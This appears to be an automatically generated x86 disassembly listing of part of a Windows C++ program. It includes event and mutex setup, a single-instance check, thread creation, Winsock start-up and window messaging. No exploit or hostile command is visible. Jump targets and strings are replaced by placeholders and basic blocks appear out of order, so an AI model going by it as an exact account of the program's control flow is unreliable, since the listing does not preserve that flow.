retn 0x14
sub_415c90
push ebp
mov ebp esp
push 0xffffffff
push sub_4313c0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
push eax
push esi
mov ecx ebx
call sub_414480
dec edi
mov [ ebp + 0xc ] edi
add esi 0x8
mov [ ebp + 0x8 ] esi
jmp r-xdata
test edi edi
jbe r-xdata
sub_415cf8
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call _CxxThrowException
mov ebx [ ebp + 0x14 ]
push esi
mov ecx ebx
call sub_415b10
add esi 0x8
cmp esi edi
jne r-xdata
sub_415d20
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_415b60
add esp 0x18
retn
sub_415d50
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
push ebp
mov ebp [ InterlockedDecrement@IAT ]
add esi 0x8
cmp esi ebx
jne r-xdata
push eax
call ebp
test eax eax
jg r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop ebp
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
mov [ eax ] r--data
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_415db0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4313d9
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x15555554
jb r-xdata
mov edx [ esp + 0x64 ]
mov eax [ edi + 0x4 ]
push ebx
push esi
mov esi [ esp + 0x68 ]
push 0x0
push edx
push eax
push esi
push eax
mov ecx edi
call sub_415bf0
mov ebx [ edi + 0x8 ]
mov ecx eax
mov eax [ edi + 0x4 ]
inc ebx
cmp esi eax
mov [ esp + 0x6c ] ecx
mov [ edi + 0x8 ] ebx
jne r-xdata
push r--data
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x50 ] 0x0
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x24 ]
call sub_403fa0
push r--data
lea ecx [ esp + 0x24 ]
push ecx
call _CxxThrowException
mov al [ esp + 0x64 ]
test al al
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax [ edi + 0x4 ]
mov [ eax ] ecx
mov edx [ edi + 0x4 ]
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov [ esi + 0x8 ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x18 ] 0x0
lea eax [ ecx + 0x4 ]
mov esi ecx
mov bl 0x1
jne r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ esp + 0x60 ]
mov [ edx + 0x18 ] bl
pop esi
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop ebx
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
push ebp
mov edi edi
cmp [ edx + 0x18 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
mov ecx [ eax ]
mov [ ecx + 0x18 ] bl
mov [ edx + 0x18 ] bl
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ eax ]
mov esi [ edx + 0x4 ]
jmp r-xdata
cmp esi [ ecx ]
jne r-xdata
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov edx [ esi + 0x4 ]
mov cl [ edx + 0x18 ]
test cl cl
lea eax [ esi + 0x4 ]
je r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x18 ] bl
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x18 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx edi
call sub_413c80
mov esi ecx
push esi
mov ecx edi
call sub_413cf0
mov eax [ esi + 0x4 ]
mov [ eax + 0x18 ] bl
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x18 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov ecx edi
call sub_413cf0
jmp r-xdata
mov esi ecx
push esi
mov ecx edi
call sub_413c80
mov ecx [ eax ]
mov ebp [ ecx + 0x4 ]
mov edx [ ebp ]
cmp ecx edx
jne r-xdata
mov ecx [ esp + 0x70 ]
pop ebp
sub_415f50
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_415c90
add esp 0x18
retn
sub_415fc0
push ecx
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi edx
mov dl [ eax + 0x19 ]
test dl dl
mov [ esp + 0x8 ] 0x1
jne r-xdata
mov eax [ esp + 0x8 ]
push ebp
push esi
push eax
lea edx [ esp + 0x20 ]
push edx
call sub_415db0
mov ecx [ eax ]
mov eax [ esp + 0x10 ]
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebp
pop ecx
retn 0x8
push edi
mov edi [ ebp ]
nop
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
cmp edi [ eax + 0xc ]
setl dl
test dl dl
mov esi eax
mov [ esp + 0xc ] dl
je r-xdata
pop edi
mov dl [ eax + 0x19 ]
test dl dl
je r-xdata
sub_416030
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_415c90
add esp 0x14
lea eax [ edi + esi * 8 ]
pop edi
pop esi
retn 0xc
sub_4160a0
push ebp
mov ebp esp
push 0xffffffff
push sub_4313f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x1c ] esi
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov [ ebp - 0x40 ] ecx
mov ebx [ eax + 0x4 ]
mov [ ebp - 0x3c ] ebx
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
push ebx
call [ InterlockedIncrement@IAT ]
mov eax [ esi + 0xc ]
sub eax edi
sar eax 0x3
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test ebx ebx
je r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ebx
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov eax [ ebp - 0x40 ]
xor esi esi
cmp eax esi
je r-xdata
test edi edi
jne r-xdata
mov ecx esi
call sub_414320
mov ebx 0x1fffffff
sub ebx ecx
cmp ebx edx
jae r-xdata
push ebx
call ??3@YAXPAX@Z
add esp 0x4
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x3c ] esi
mov [ eax ] r--data
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov eax ebx
mov edi [ ebp + 0x8 ]
sub eax edi
sar eax 0x3
cmp eax edx
jae r-xdata
mov ecx eax
shr ecx 0x1
mov ebx 0x1fffffff
sub ebx ecx
cmp ebx eax
jae r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
lea ecx [ edx * 8 ]
mov [ ebp - 0x18 ] ecx
mov eax ebx
sub eax ecx
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x34 ]
push ecx
push esi
push ebx
push ebx
push eax
call sub_415b60
mov [ esi + 0x8 ] eax
mov edx [ ebp - 0x38 ]
push edx
push ebx
mov eax [ ebp - 0x28 ]
push eax
push edi
call sub_4143e0
lea ecx [ ebp - 0x40 ]
push ecx
mov edx [ ebp - 0x18 ]
add edx edi
push edx
push edi
call sub_414c80
add esp 0x30
lea eax [ edx * 8 ]
mov [ ebp - 0x18 ] eax
add eax edi
mov ecx [ ebp - 0x30 ]
push ecx
push esi
push eax
push ebx
push edi
call sub_415b60
add esp 0x14
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x8 ]
lea edx [ ebp - 0x40 ]
push edx
mov edx eax
sub edx edi
sar edx 0x3
mov ecx [ ebp + 0xc ]
sub ecx edx
push ecx
push eax
mov ecx esi
call sub_416030
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x18 ]
mov ebx [ esi + 0x8 ]
add ebx eax
mov [ esi + 0x8 ] ebx
mov esi ebx
lea ecx [ ebp - 0x40 ]
push ecx
sub esi eax
push esi
push edi
call sub_414c80
add esp 0xc
jmp r-xdata
add eax ecx
xor eax eax
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x3
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
shl eax 0x3
mov [ ebp - 0x20 ] eax
push eax
call sub_42e3bc
add esp 0x4
mov edi eax
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x1
push edi
mov ebx [ ebp + 0x8 ]
push ebx
mov edx [ esi + 0x4 ]
push edx
mov ecx esi
call sub_415f80
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x40 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
push eax
mov ecx esi
call sub_416030
mov [ ebp - 0x14 ] eax
push eax
mov eax [ esi + 0x8 ]
push eax
push ebx
mov ecx esi
call sub_415f80
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax edi
sar eax 0x3
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax edi
mov [ esi + 0xc ] eax
lea ecx [ edi + ebx * 8 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] edi
jmp r-xdata
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x2c ]
push edx
push esi
push eax
push ecx
call sub_415d50
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x14
mov ebx [ ebp + 0xc ]
add ebx eax
test ecx ecx
je r-xdata
add eax edx
sub_4162b8
mov eax [ ebp + 0xc ]
shl eax 0x3
mov ecx [ ebp - 0x1c ]
mov edx [ ecx + 0x8 ]
add edx eax
push edx
mov edx [ ebp + 0x8 ]
add eax edx
push eax
call sub_416060
push 0x0
push 0x0
call _CxxThrowException
sub_416380
push 0xffffffff
push sub_431420
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push esi
mov esi ecx
lea eax [ esi + 0xc ]
push edi
lea edi [ eax + 0x4 ]
push edi
mov [ esp + 0xc ] eax
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x28 ] 0x0
mov eax [ esp + 0x30 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
push eax
lea edx [ esp + 0x34 ]
mov [ esp + 0x34 ] ecx
push edx
lea ecx [ esp + 0x1c ]
call sub_414dc0
mov [ esp + 0x28 ] 0x1
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx esi
call sub_415fc0
mov [ esp + 0x28 ] 0x0
lea ecx [ esp + 0x14 ]
call sub_415780
mov [ esp + 0x28 ] 0xffffffff
push edi
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x20 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x24
retn 0x4
sub_416420
mov edx [ esp + 0x8 ]
push esi
push edi
mov edi ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x3
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
push 0x1
push edx
mov ecx edi
call sub_4160a0
mov ecx [ edi + 0x4 ]
mov eax [ esp + 0xc ]
lea edx [ ecx + esi * 8 ]
pop edi
mov [ eax ] edx
pop esi
retn 0xc
mov esi edx
sub esi ecx
sar esi 0x3
sub_416470
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
test edx edx
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esi + 0x8 ]
push edx
push 0x1
push eax
mov ecx esi
call sub_4160a0
pop esi
retn 0x4
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x3
cmp ecx eax
jae r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x8 ]
push edi
mov edi [ esi + 0x8 ]
push eax
push esi
push ecx
push 0x1
push edi
call sub_415c90
add esp 0x14
add edi 0x8
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x4
sub_4164f0
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_431456
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push ebp
push esi
push edi
mov edi [ CreateEventW@IAT ]
xor ebx ebx
push ebx
push ebx
mov ebp 0x1
push ebp
push ebx
mov esi ecx
call edi
push ebx
push ebx
push ebp
push ebx
mov [ esi + 0x8 ] eax
call edi
push ebx
push ebx
push ebp
push ebx
mov [ esi + 0xc ] eax
call edi
push ebx
push ebx
push ebx
push ebx
mov [ esi + 0x18 ] eax
call edi
push ebx
push ebx
push ebp
push ebx
mov [ esi + 0x1c ] eax
call edi
push ebx
push ebx
push ebx
push ebx
mov [ esi + 0x10 ] eax
call edi
push ebx
push ebx
push ebx
push ebx
mov [ esi + 0x14 ] eax
call edi
push r--data
push ebx
push 0x1f0001
mov [ esi + 0x54 ] eax
call [ OpenMutexW@IAT ]
cmp [ esi + 0x8 ] ebx
mov [ esi + 0x2cc ] eax
je r-xdata
mov ecx esi
xor ebp ebp
call sub_414010
cmp [ esi + 0xc ] ebx
je r-xdata
xor eax eax
mov ecx [ esi + 0x54 ]
mov [ eax ] r--data
mov [ esp + 0x24 ] 0x1
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ esp + 0x24 ] bl
jmp r-xdata
cmp [ esi + 0x18 ] ebx
je r-xdata
xor eax eax
push esi
mov ecx eax
call sub_413f50
jmp r-xdata
or edi 0xffffffff
mov [ esp + 0x24 ] edi
push eax
lea ecx [ esp + 0x18 ]
call sub_4141f0
mov [ esp + 0x24 ] 0x2
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esi + 0x138 ]
call sub_416470
lea ecx [ esp + 0x14 ]
push ecx
lea ecx [ esi + 0xbc ]
call sub_416470
push 0xc
call sub_42e3bc
add esp 0x4
mov [ esp + 0x10 ] eax
mov [ esp + 0x24 ] 0x3
cmp eax ebx
je r-xdata
cmp [ esi + 0x1c ] ebx
je r-xdata
mov ecx [ esp + 0x1c ]
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x18
retn
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov [ esp + 0x24 ] 0x2
push eax
mov ecx esi
call sub_414a10
push esi
call sub_41d590
mov ecx eax
call sub_416380
mov [ esp + 0x24 ] edi
mov esi [ esp + 0x18 ]
cmp esi ebx
je r-xdata
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
cmp [ esi + 0x14 ] ebx
je r-xdata
push esi
call ??3@YAXPAX@Z
add esp 0x4
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
push eax
mov [ eax ] r--data
call ??3@YAXPAX@Z
add esp 0x4
cmp [ esi + 0x54 ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
push 0x8
call sub_42e3bc
add esp 0x4
mov [ esp + 0x10 ] eax
mov [ esp + 0x24 ] ebx
cmp eax ebx
je r-xdata
sub_4166a0
push esi
mov esi ecx
mov ecx [ esi + 0x5c ]
test ecx ecx
mov eax 0x1
jne r-xdata
pop esi
retn
push edi
mov ecx esi
call sub_4164f0
mov edi eax
test edi edi
je r-xdata
mov eax edi
mov [ esi + 0x5c ] 0x1
pop edi
push ebx
push 0x0
push 0x0
push esi
push sub_415630
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call [ CreateEventW@IAT ]
test eax eax
mov [ esi + 0x58 ] eax
jne r-xdata
mov ecx esi
xor edi edi
call sub_414010
pop ebx
mov ecx esi
xor edi edi
call sub_414010
push edi
push ebx
call [ TerminateThread@IAT ]
sub_416720
push 0xffffffff
push sub_43148f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x49c
mov eax [ rw-data ]
push esi
mov esi [ esp + 0x4b0 ]
push esi
push r--data
mov [ esp + 0x4a4 ] eax
call sub_427f80
add esp 0x8
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0x4a0 ]
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x49c ]
pop esi
call sub_42e72f
add esp 0x4a8
retn
push ebx
lea eax [ esp + 0x310 ]
push eax
push 0x101
call [ WSAStartup@IAT ]
call sub_401aa0
mov ecx eax
call sub_4018a0
call sub_401aa0
push r--data
push eax
lea ecx [ esp + 0x2c ]
push ecx
call sub_401740
add esp 0xc
mov [ esp + 0x4ac ] 0x0
lea ecx [ esp + 0x24 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
call sub_427f80
call sub_401aa0
push r--data
push eax
lea edx [ esp + 0x14 ]
push edx
call sub_401740
add esp 0x10
mov [ esp + 0x4ac ] 0x1
push eax
call sub_418800
mov ecx eax
call sub_418720
mov ebx eax
neg ebx
sbb bl bl
inc bl
mov [ esp + 0x4ac ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
test bl bl
je r-xdata
call sub_401aa0
add eax 0x220
push r--data
push eax
lea eax [ esp + 0x10 ]
push eax
call sub_401740
add esp 0xc
mov [ esp + 0x4ac ] 0x2
push eax
call sub_418800
mov ecx eax
call sub_418880
mov ebx eax
neg ebx
sbb bl bl
inc bl
mov [ esp + 0x4ac ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
test bl bl
je r-xdata
push r--data
lea ecx [ esp + 0x40 ]
call sub_4158b0
mov [ esp + 0x4ac ] 0x3
lea ecx [ esp + 0x40 ]
call sub_4166a0
cmp eax 0x1
jne r-xdata
push r--data
jmp r-xdata
call sub_401aa0
mov ecx eax
call sub_4016e0
mov [ esp + 0x4ac ] 0x0
lea ecx [ esp + 0x40 ]
call sub_415980
jmp r-xdata
call sub_42b600
mov ecx eax
call sub_42b960
call sub_42b600
mov ecx [ eax ]
push ecx
call [ ResetEvent@IAT ]
call sub_4122b0
mov ecx eax
call sub_411940
call sub_4122b0
mov ecx eax
call sub_412090
call sub_413620
call sub_4122b0
mov ecx eax
call sub_411780
call sub_418800
mov ecx eax
call sub_4187d0
call sub_427f80
add esp 0x4
mov [ esp + 0x4ac ] 0xffffffff
lea ecx [ esp + 0x24 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
xor eax eax
pop ebx
sub_416960
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4314bb
push eax
mov [ fs : 0x0 ] esp
sub esp 0x5c
push esi
mov esi [ esp + 0x70 ]
push r--data
push 0x0
push 0x0
mov [ rw-data ] esi
call [ CreateMutexW@IAT ]
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
call sub_413730
push 0x0
call [ CoInitialize@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
call [ DefWindowProcW@IAT ]
lea eax [ esp + 0x4 ]
push eax
mov [ esp + 0x8 ] 0x8
mov [ esp + 0xc ] 0x404
call [ InitCommonControlsEx@IAT ]
push r--data
push esi
push 0x0
mov ecx rw-data
call sub_414110
call [ Ordinal_ATL71_42@IAT ]
push r--data
lea ecx [ esp + 0x2c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x68 ] 0x0
push r--data
lea ecx [ esp + 0x10 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x68 ] 0x1
lea ecx [ esp + 0x44 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x68 ] 0x2
push eax
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x14 ]
push edx
call sub_427e20
add esp 0xc
mov [ esp + 0x68 ] 0x1
lea ecx [ esp + 0x44 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x68 ] 0x0
lea ecx [ esp + 0xc ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x68 ] 0xffffffff
lea ecx [ esp + 0x28 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov eax [ esp + 0x7c ]
mov ecx [ esp + 0x78 ]
push eax
push ecx
call sub_416720
add esp 0x8
mov ecx rw-data
mov esi eax
call sub_415ab0
call [ CoUninitialize@IAT ]
mov ecx [ esp + 0x60 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x68
retn 0x10
xor eax eax
pop esi
mov ecx [ esp + 0x5c ]
mov [ fs : 0x0 ] ecx
add esp 0x68
retn 0x10
sub_416ac0
push 0xffffffff
push sub_4314d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_409c60
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esi ] r--data
mov [ esi + 0x110 ] eax
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_416b10
push 0xffffffff
push sub_4314f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ ecx ] r--data
mov [ esp + 0xc ] 0xffffffff
call sub_409960
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_416b50
mov eax [ esp + 0x10 ]
push esi
mov esi ecx
mov [ eax ] 0x0
mov ecx [ esi + 0x4 ]
push ecx
call sub_418680
mov edx [ esi + 0x4 ]
add esp 0x4
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
push edx
call [ SetWindowPos@IAT ]
xor eax eax
pop esi
retn 0x10
sub_416bf0
push 0xffffffff
push sub_431524
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esi + 0x4 ] 0xd
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x8 ]
mov [ esi ] r--data
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_416c80
push 0xffffffff
push sub_431544
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov [ esi ] r--data
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_416d00
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_43155b
push eax
mov [ fs : 0x0 ] esp
push ebx
mov ebx [ ??$?8_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA_NABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@PB_W@Z@IAT ]
push esi
mov esi [ esp + 0x18 ]
push edi
push r--data
push esi
mov edi ecx
call ebx
add esp 0x8
test al al
je r-xdata
push r--data
push esi
call ebx
add esp 0x8
test al al
je r-xdata
mov eax [ edi + 0x4 ]
push 0x0
push 0x0
push 0x10
push eax
call [ PostMessageW@IAT ]
mov [ edi + 0x110 ] 0x1
jmp r-xdata
push r--data
push esi
call ebx
add esp 0x8
test al al
je r-xdata
mov ecx [ edi + 0x4 ]
push 0x0
push 0x0
push 0x422
push ecx
jmp r-xdata
mov ecx [ esp + 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn 0x8
push 0x24
call sub_42e3bc
add esp 0x4
mov [ esp + 0x1c ] eax
mov [ esp + 0x14 ] 0x0
test eax eax
je r-xdata
call [ PostMessageW@IAT ]
xor esi esi
mov ecx eax
call sub_416bf0
mov esi eax
jmp r-xdata
mov [ esp + 0x14 ] 0xffffffff
mov edx [ esp + 0x20 ]
push edx
lea ecx [ esi + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov eax [ edi + 0x4 ]
push 0x0
push esi
push 0x422
push eax
sub_416df0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_43157b
push eax
mov eax [ esp + 0x10 ]
test eax eax
mov [ fs : 0x0 ] esp
push esi
mov esi ecx
mov [ esi ] eax
je r-xdata
mov [ esi + 0x4 ] 0x0
push 0x4
call sub_42e3bc
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ esp + 0xc ] 0x0
test eax eax
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ esp + 0x4 ]
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
push eax
call [ InterlockedIncrement@IAT ]
mov eax esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov [ esp + 0xc ] 0xffffffff
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
sub_416e80
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
